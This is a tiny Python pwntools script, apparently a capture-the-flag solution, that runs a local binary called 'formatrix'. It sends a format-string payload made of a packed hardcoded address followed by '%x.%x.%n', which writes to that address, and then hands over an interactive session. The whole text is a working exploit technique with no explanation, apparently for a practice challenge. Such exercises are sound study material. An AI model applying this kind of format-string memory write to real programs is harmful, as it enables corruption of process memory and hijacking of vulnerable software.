from pwn import *

p = process('./formatrix')

p.recv()
pause()
p.sendline(p32(0xffd16c4c)+"%x.%x.%n")
p.interactive()
